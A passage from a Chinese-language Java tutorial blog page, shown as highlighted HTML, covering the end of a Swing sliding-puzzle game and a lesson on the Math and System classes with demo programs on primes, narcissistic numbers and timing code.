class="line"></span><br><span class="line">        <span class="comment">//将菜单里面的两个选项添加到菜单当中</span></span><br><span class="line">        jMenuBar.add(functionJMenu);</span><br><span class="line">        jMenuBar.add(aboutJMenu);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//给整个界面设置菜单</span></span><br><span class="line">        <span class="built_in">this</span>.setJMenuBar(jMenuBar);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">initJFrame</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="comment">//设置界面的宽高</span></span><br><span class="line">        <span class="built_in">this</span>.setSize(<span class="number">603</span>, <span class="number">680</span>);</span><br><span class="line">        <span class="comment">//设置界面的标题</span></span><br><span class="line">        <span class="built_in">this</span>.setTitle(<span class="string">&quot;拼图单机版 v1.0&quot;</span>);</span><br><span class="line">        <span class="comment">//设置界面置顶</span></span><br><span class="line">        <span class="built_in">this</span>.setAlwaysOnTop(<span class="literal">true</span>);</span><br><span class="line">        <span class="comment">//设置界面居中</span></span><br><span class="line">        <span class="built_in">this</span>.setLocationRelativeTo(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//设置关闭模式</span></span><br><span class="line">        <span class="built_in">this</span>.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">        <span class="comment">//取消默认的居中放置，只有取消了才会按照XY轴的形式添加组件</span></span><br><span class="line">        <span class="built_in">this</span>.setLayout(<span class="literal">null</span>);</span><br><span class="line">        <span class="comment">//给整个界面添加键盘监听事件</span></span><br><span class="line">        <span class="built_in">this</span>.addKeyListener(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">keyTyped</span><span class="params">(KeyEvent e)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//按下不松时会调用这个方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">keyPressed</span><span class="params">(KeyEvent e)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">code</span> <span class="operator">=</span> e.getKeyCode();</span><br><span class="line">        <span class="keyword">if</span> (code == <span class="number">65</span>)&#123;</span><br><span class="line">            <span class="comment">//把界面中所有的图片全部删除</span></span><br><span class="line">            <span class="built_in">this</span>.getContentPane().removeAll();</span><br><span class="line">            <span class="comment">//加载第一张完整的图片</span></span><br><span class="line">            <span class="type">JLabel</span> <span class="variable">all</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="keyword">new</span> <span class="title class_">ImageIcon</span>(path + <span class="string">&quot;all.jpg&quot;</span>));</span><br><span class="line">            all.setBounds(<span class="number">83</span>,<span class="number">134</span>,<span class="number">420</span>,<span class="number">420</span>);</span><br><span class="line">            <span class="built_in">this</span>.getContentPane().add(all);</span><br><span class="line">            <span class="comment">//加载背景图片</span></span><br><span class="line">            <span class="comment">//添加背景图片</span></span><br><span class="line">            <span class="type">JLabel</span> <span class="variable">background</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="keyword">new</span> <span class="title class_">ImageIcon</span>(<span class="string">&quot;puzzlegame\\image\\background.png&quot;</span>));</span><br><span class="line">            background.setBounds(<span class="number">40</span>, <span class="number">40</span>, <span class="number">508</span>, <span class="number">560</span>);</span><br><span class="line">            <span class="comment">//把背景图片添加到界面当中</span></span><br><span class="line">            <span class="built_in">this</span>.getContentPane().add(background);</span><br><span class="line">            <span class="comment">//刷新界面</span></span><br><span class="line">            <span class="built_in">this</span>.getContentPane().repaint();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//松开按键的时候会调用这个方法</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">keyReleased</span><span class="params">(KeyEvent e)</span> &#123;</span><br><span class="line">        <span class="comment">//判断游戏是否胜利，如果胜利，此方法需要直接结束，不能再执行下面的移动代码了</span></span><br><span class="line">        <span class="keyword">if</span>(victory())&#123;</span><br><span class="line">            <span class="comment">//结束方法</span></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//对上，下，左，右进行判断</span></span><br><span class="line">        <span class="comment">//左：37 上：38 右：39 下：40</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">code</span> <span class="operator">=</span> e.getKeyCode();</span><br><span class="line">        System.out.println(code);</span><br><span class="line">        <span class="keyword">if</span> (code == <span class="number">37</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;向左移动&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(y == <span class="number">3</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//逻辑：</span></span><br><span class="line">            <span class="comment">//把空白方块右方的数字往左移动</span></span><br><span class="line">            data[x][y] = data[x][y + <span class="number">1</span>];</span><br><span class="line">            data[x][y + <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">            y++;</span><br><span class="line">            <span class="comment">//每移动一次，计数器就自增一次。</span></span><br><span class="line">            step++;</span><br><span class="line">            <span class="comment">//调用方法按照最新的数字加载图片</span></span><br><span class="line">            initImage();</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (code == <span class="number">38</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;向上移动&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(x == <span class="number">3</span>)&#123;</span><br><span class="line">                <span class="comment">//表示空白方块已经在最下方了，他的下面没有图片再能移动了</span></span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//逻辑：</span></span><br><span class="line">            <span class="comment">//把空白方块下方的数字往上移动</span></span><br><span class="line">            <span class="comment">//x，y  表示空白方块</span></span><br><span class="line">            <span class="comment">//x + 1， y 表示空白方块下方的数字</span></span><br><span class="line">            <span class="comment">//把空白方块下方的数字赋值给空白方块</span></span><br><span class="line">            data[x][y] = data[x + <span class="number">1</span>][y];</span><br><span class="line">            data[x + <span class="number">1</span>][y] = <span class="number">0</span>;</span><br><span class="line">            x++;</span><br><span class="line">            <span class="comment">//每移动一次，计数器就自增一次。</span></span><br><span class="line">            step++;</span><br><span class="line">            <span class="comment">//调用方法按照最新的数字加载图片</span></span><br><span class="line">            initImage();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (code == <span class="number">39</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;向右移动&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(y == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//逻辑：</span></span><br><span class="line">            <span class="comment">//把空白方块左方的数字往右移动</span></span><br><span class="line">            data[x][y] = data[x][y - <span class="number">1</span>];</span><br><span class="line">            data[x][y - <span class="number">1</span>] = <span class="number">0</span>;</span><br><span class="line">            y--;</span><br><span class="line">            <span class="comment">//每移动一次，计数器就自增一次。</span></span><br><span class="line">            step++;</span><br><span class="line">            <span class="comment">//调用方法按照最新的数字加载图片</span></span><br><span class="line">            initImage();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (code == <span class="number">40</span>) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;向下移动&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(x == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//逻辑：</span></span><br><span class="line">            <span class="comment">//把空白方块上方的数字往下移动</span></span><br><span class="line">            data[x][y] = data[x - <span class="number">1</span>][y];</span><br><span class="line">            data[x - <span class="number">1</span>][y] = <span class="number">0</span>;</span><br><span class="line">            x--;</span><br><span class="line">            <span class="comment">//每移动一次，计数器就自增一次。</span></span><br><span class="line">            step++;</span><br><span class="line">            <span class="comment">//调用方法按照最新的数字加载图片</span></span><br><span class="line">            initImage();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span>(code == <span class="number">65</span>)&#123;</span><br><span class="line">            initImage();</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(code == <span class="number">87</span>)&#123;</span><br><span class="line">            data = <span class="keyword">new</span> <span class="title class_">int</span>[][]&#123;</span><br><span class="line">                &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>&#125;,</span><br><span class="line">                &#123;<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>&#125;,</span><br><span class="line">                &#123;<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>&#125;,</span><br><span class="line">                &#123;<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">0</span>&#125;</span><br><span class="line">            &#125;;</span><br><span class="line">            initImage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//判断data数组中的数据是否跟win数组中相同</span></span><br><span class="line">    <span class="comment">//如果全部相同，返回true。否则返回false</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">victory</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; data.length; i++) &#123;</span><br><span class="line">            <span class="comment">//i : 依次表示二维数组 data里面的索引</span></span><br><span class="line">            <span class="comment">//data[i]：依次表示每一个一维数组</span></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">j</span> <span class="operator">=</span> <span class="number">0</span>; j &lt; data[i].length; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span>(data[i][j] != win[i][j]) &#123;</span><br><span class="line">                    <span class="comment">//只要有一个数据不一样，则返回false</span></span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//循环结束表示数组遍历比较完毕，全都一样返回true</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">actionPerformed</span><span class="params">(ActionEvent e)</span> &#123;</span><br><span class="line">        <span class="comment">//获取当前被点击的条目对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> e.getSource();</span><br><span class="line">        <span class="comment">//判断</span></span><br><span class="line">        <span class="keyword">if</span>(obj == replayItem)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;重新游戏&quot;</span>);</span><br><span class="line">            <span class="comment">//计步器清零</span></span><br><span class="line">            step = <span class="number">0</span>;</span><br><span class="line">            <span class="comment">//再次打乱二维数组中的数据</span></span><br><span class="line">            initData();</span><br><span class="line">            <span class="comment">//重新加载图片</span></span><br><span class="line">            initImage();</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(obj == reLoginItem)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;重新登录&quot;</span>);</span><br><span class="line">            <span class="comment">//关闭当前的游戏界面</span></span><br><span class="line">            <span class="built_in">this</span>.setVisible(<span class="literal">false</span>);</span><br><span class="line">            <span class="comment">//打开登录界面</span></span><br><span class="line">            <span class="keyword">new</span> <span class="title class_">LoginJFrame</span>();</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(obj == closeItem)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;关闭游戏&quot;</span>);</span><br><span class="line">            <span class="comment">//直接关闭虚拟机即可</span></span><br><span class="line">            System.exit(<span class="number">0</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span>(obj == accountItem)&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;公众号&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">//创建一个弹框对象</span></span><br><span class="line">            <span class="type">JDialog</span> <span class="variable">jDialog</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JDialog</span>();</span><br><span class="line">            <span class="comment">//创建一个管理图片的容器对象JLabel</span></span><br><span class="line">            <span class="type">JLabel</span> <span class="variable">jLabel</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JLabel</span>(<span class="keyword">new</span> <span class="title class_">ImageIcon</span>(<span class="string">&quot;puzzlegame\\image\\about.png&quot;</span>));</span><br><span class="line">            <span class="comment">//设置位置和宽高</span></span><br><span class="line">            jLabel.setBounds(<span class="number">0</span>,<span class="number">0</span>,<span class="number">258</span>,<span class="number">258</span>);</span><br><span class="line">            <span class="comment">//把图片添加到弹框当中</span></span><br><span class="line">            jDialog.getContentPane().add(jLabel);</span><br><span class="line">            <span class="comment">//给弹框设置大小</span></span><br><span class="line">            jDialog.setSize(<span class="number">344</span>,<span class="number">344</span>);</span><br><span class="line">            <span class="comment">//让弹框置顶</span></span><br><span class="line">            jDialog.setAlwaysOnTop(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">//让弹框居中</span></span><br><span class="line">            jDialog.setLocationRelativeTo(<span class="literal">null</span>);</span><br><span class="line">            <span class="comment">//弹框不关闭则无法操作下面的界面</span></span><br><span class="line">            jDialog.setModal(<span class="literal">true</span>);</span><br><span class="line">            <span class="comment">//让弹框显示出来</span></span><br><span class="line">            jDialog.setVisible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Day18-API（常见API，对象克隆）"><a class="header-anchor" href="#Day18-API（常见API，对象克隆）">¶</a>Day18 API（常见API，对象克隆）</h2>
<h3 id="学习目标-v3"><a class="header-anchor" href="#学习目标-v3">¶</a>学习目标</h3>
<ul>
<li>能够熟练使用Math类中的常见方法</li>
<li>能够熟练使用System类中的常见方法</li>
<li>能够理解Object类的常见方法作用</li>
<li>能够熟练使用Objects类的常见方法</li>
<li>能够熟练使用BigInteger类的常见方法</li>
<li>能够熟练使用BigDecimal类的常见方法</li>
</ul>
<h3 id="Math类（了解内容）"><a class="header-anchor" href="#Math类（了解内容）">¶</a>Math类（了解内容）</h3>
<ul>
<li>Math类所在包为java.lang包，因此在使用的时候不需要进行导包。并且Math类被final修饰了，因此该类是不能被继承的</li>
<li>Math类包含：执行基本数字运算的方法，使用Math类完成基本的数学运算</li>
<li>不能直接通过new关键字去创建Math类的对象（API文档中没有体现可用的构造方法）</li>
<li>但是文档显示Math类中所有方法都是静态的→可以直接通过类名Math去调用</li>
</ul>
<h4 id="常见方法"><a class="header-anchor" href="#常见方法">¶</a>常见方法</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">abs</span><span class="params">(<span class="type">int</span> a)</span>          <span class="comment">// 返回参数的绝对值</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">ceil</span><span class="params">(<span class="type">double</span> a)</span>       <span class="comment">// 返回大于或等于参数的最小整数</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">floor</span><span class="params">(<span class="type">double</span> a)</span>      <span class="comment">// 返回小于或等于参数的最大整数</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">round</span><span class="params">(<span class="type">float</span> a)</span>        <span class="comment">// 按照四舍五入返回最接近参数的int类型值</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">max</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>        <span class="comment">// 获取两个int值中的较大值</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">min</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>        <span class="comment">// 获取两个int值中的较小值</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">pow</span> <span class="params">(<span class="type">double</span> a,<span class="type">double</span> b)</span>  <span class="comment">// 计算a的b次幂的值</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">double</span> <span class="title function_">random</span><span class="params">()</span>         <span class="comment">// 返回一个[0.0,1.0)的随机值</span></span><br></pre></td></tr></table></figure>
<h4 id="案例演示-v2"><a class="header-anchor" href="#案例演示-v2">¶</a>案例演示</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MathDemo01</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// public static int abs(int a)         返回参数的绝对值</span></span><br><span class="line">        System.out.println(<span class="string">&quot;-2的绝对值为：&quot;</span> + Math.abs(-<span class="number">2</span>));  <span class="comment">// 2</span></span><br><span class="line">        System.out.println(<span class="string">&quot;2的绝对值为：&quot;</span> + Math.abs(<span class="number">2</span>));  <span class="comment">// 2</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// public static double ceil(double a)  返回大于或等于参数的最小整数</span></span><br><span class="line">        System.out.println(<span class="string">&quot;大于或等于23.45的最小整数位：&quot;</span> + Math.ceil(<span class="number">23.45</span>));  <span class="comment">// 24.0</span></span><br><span class="line">        System.out.println(<span class="string">&quot;大于或等于-23.45的最小整数位：&quot;</span> + Math.ceil(-<span class="number">23.45</span>));  <span class="comment">// -23.0</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// public static double floor(double a) 返回小于或等于参数的最大整数</span></span><br><span class="line">        System.out.println(<span class="string">&quot;小于或等于23.45的最大整数位：&quot;</span> + Math.floor(<span class="number">23.45</span>));  <span class="comment">// 23.0 </span></span><br><span class="line">        System.out.println(<span class="string">&quot;小于或等于-23.45的最大整数位：&quot;</span> + Math.floor(-<span class="number">23.45</span>));  <span class="comment">// -24.0</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// public static int round(float a)     按照四舍五入返回最接近参数的int</span></span><br><span class="line">        System.out.println(<span class="string">&quot;23.45四舍五入的结果为：&quot;</span> + Math.round(<span class="number">23.45</span>));  <span class="comment">// 23</span></span><br><span class="line">        System.out.println(<span class="string">&quot;23.55四舍五入的结果为：&quot;</span> + Math.round(<span class="number">23.55</span>));  <span class="comment">// 24</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// public static int max(int a,int b)   返回两个int值中的较大值</span></span><br><span class="line">        System.out.println(<span class="string">&quot;23和45的最大值为: &quot;</span> + Math.max(<span class="number">23</span>, <span class="number">45</span>));  <span class="comment">// 45</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// public static int min(int a,int b)   返回两个int值中的较小值</span></span><br><span class="line">        System.out.println(<span class="string">&quot;12和34的最小值为: &quot;</span> + Math.min(<span class="number">12</span> , <span class="number">34</span>));  <span class="comment">// 12</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// public static double pow (double a,double b)返回a的b次幂的值</span></span><br><span class="line">        System.out.println(<span class="string">&quot;2的3次幂计算结果为: &quot;</span> + Math.pow(<span class="number">2</span>,<span class="number">3</span>));  <span class="comment">// 8.0</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// public static double random()返回值为double的正值，[0.0,1.0)</span></span><br><span class="line">        System.out.println(<span class="string">&quot;获取到的0-1之间的随机数为: &quot;</span> + Math.random());  <span class="comment">// 0.7322484131745958</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="算法小题（质数）"><a class="header-anchor" href="#算法小题（质数）">¶</a>算法小题（质数）</h4>
<ul>
<li>需求：判断一个数是否为一个质数</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MathDemo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//判断一个数是否为一个质数</span></span><br><span class="line">        System.out.println(isPrime(<span class="number">997</span>));</span><br><span class="line">        <span class="comment">//997 2~996 995次</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isPrime</span><span class="params">(<span class="type">int</span> number)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &lt;= Math.sqrt(number); i++) &#123;</span><br><span class="line">            count++;</span><br><span class="line">            <span class="keyword">if</span> (number % i == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(count);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="算法小题（自幂数）"><a class="header-anchor" href="#算法小题（自幂数）">¶</a>算法小题（自幂数）</h4>
<ul>
<li>自幂数，一个n位自然数等于自身各个数位上数字的n次幂之和
<ul>
<li>举例1：三位数  1^3 + 5^3 + 3^3 = 153</li>
<li>举例2：四位数  1^4 + 6^4 + 3^4 + 4^3 = 1634</li>
</ul>
</li>
<li>如果自幂数是：
<ul>
<li>一位自幂数，也叫做：独身数</li>
<li>三位自幂数：水仙花数  四位自幂数：四叶玫瑰数</li>
<li>五位自幂数：五角星数  六位自幂数：六合数</li>
<li>七位自幂数：北斗七星数  八位自幂数：八仙数</li>
<li>九位自幂数：九九重阳数  十位自幂数：十全十美数</li>
</ul>
</li>
<li>要求1：统计一共有多少个水仙花数。</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//水仙花数:100 ~ 999</span></span><br><span class="line"><span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"><span class="comment">//得到每一个三位数</span></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">100</span>; i &lt;= <span class="number">999</span>; i++) &#123;</span><br><span class="line">    <span class="comment">//个位 十位 百位</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">ge</span> <span class="operator">=</span> i % <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">shi</span> <span class="operator">=</span> i / <span class="number">10</span> % <span class="number">10</span>;</span><br><span class="line">    <span class="type">int</span> <span class="variable">bai</span> <span class="operator">=</span> i / <span class="number">100</span> % <span class="number">10</span>;</span><br><span class="line">    <span class="comment">//判断:</span></span><br><span class="line">    <span class="comment">//每一位的三次方之和 跟本身 进行比较。</span></span><br><span class="line">    <span class="type">double</span> <span class="variable">sum</span> <span class="operator">=</span> Math.pow(ge, <span class="number">3</span>) + Math.pow(shi, <span class="number">3</span>) + Math.pow(bai, <span class="number">3</span>);</span><br><span class="line">    <span class="keyword">if</span> (sum == i) &#123;</span><br><span class="line">        count++;</span><br><span class="line">        <span class="comment">//System.out.println(i);</span></span><br><span class="line"></span><br><span class="line">        System.out.println(count);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="课后练习"><a class="header-anchor" href="#课后练习">¶</a>课后练习</h4>
<ul>
<li>要求2：（课后作业）证明没有两位的自幂数。</li>
<li>要求3：（课后作业）分别统计有多少个四叶玫瑰数和五角星数。（答案：都是3个）</li>
</ul>
<h3 id="System类"><a class="header-anchor" href="#System类">¶</a>System类</h3>
<ul>
<li>System类所在包为java.lang包，因此在使用的时候不需要进行导包。并且System类被final修饰了，因此该类是不能被继承的</li>
<li>System包含了系统操作的一些常用的方法</li>
<li>在API文档中没有体现可用的构造方法，因此我们就不能直接通过new关键字去创建System类的对象。</li>
<li>System类中的方法都是静态的，因此在使用的时候我们可以直接通过类名去调用（Nested Class Summary内部类或者内部接口的描述）</li>
</ul>
<h4 id="常见方法-v2"><a class="header-anchor" href="#常见方法-v2">¶</a>常见方法</h4>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">long</span> <span class="title function_">currentTimeMillis</span><span class="params">()</span>      <span class="comment">// 获取当前时间所对应的毫秒值（当前时间为0时区所对应的时间即就是英国格林尼治天文台旧址所在位置）</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">exit</span><span class="params">(<span class="type">int</span> status)</span>       <span class="comment">// 终止当前正在运行的Java虚拟机，0表示正常退出，非零表示异常退出</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title function_">arraycopy</span><span class="params">(Object src,  <span class="type">int</span>  srcPos, Object dest, <span class="type">int</span> destPos, <span class="type">int</span> length)</span>; <span class="comment">// 进行数值元素copy</span></span><br></pre></td></tr></table></figure>
<h4 id="案例演示-v3"><a class="header-anchor" href="#案例演示-v3">¶</a>案例演示</h4>
<h5 id="案例1：演示currentTimeMillis方法"><a class="header-anchor" href="#案例1：演示currentTimeMillis方法">¶</a>案例1：演示currentTimeMillis方法</h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SystemDemo01</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">// 获取当前时间所对应的毫秒值</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">millis</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        <span class="comment">// 输出结果</span></span><br><span class="line">        System.out.println(<span class="string">&quot;当前时间所对应的毫秒值为：&quot;</span> + millis);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>获取到当前时间的毫秒值的意义
<ul>
<li>常常来需要统计某一段代码的执行时间。</li>
<li>此时就可以在执行这段代码之前获取一次时间，在执行完毕以后再次获取一次系统时间，然后计算两个时间的差值</li>
<li>这个差值就是这段代码执行完毕以后所需要的时间</li>
</ul>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SystemDemo2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//计算某一段代码的执行时间</span></span><br><span class="line"></span><br><span class="line">        <span class="type">long</span> <span class="variable">start</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">1</span>; i &lt;= <span class="number">100000</span>; i++) &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">flag</span> <span class="operator">=</span> isPrime2(i);</span><br><span class="line">            <span class="keyword">if</span> (flag) &#123;</span><br><span class="line">                System.out.println(i);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="variable">end</span> <span class="operator">=</span> System.currentTimeMillis();</span><br><span class="line">        <span class="comment">//获取程序运行的总时间</span></span><br><span class="line">        System.out.println(end - start); <span class="comment">//方式一：1514 毫秒  方式二：71毫秒</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//以前判断是否为质数的方式</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isPrime1</span><span class="params">(<span class="type">int</span> number)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &lt; number; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (number % i == <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//改进之后判断是否为质数的方式（效率高）</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">boolean</span> <span class="title function_">isPrime2</span><span class="params">(<span class="type">int</span> number)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &lt;= 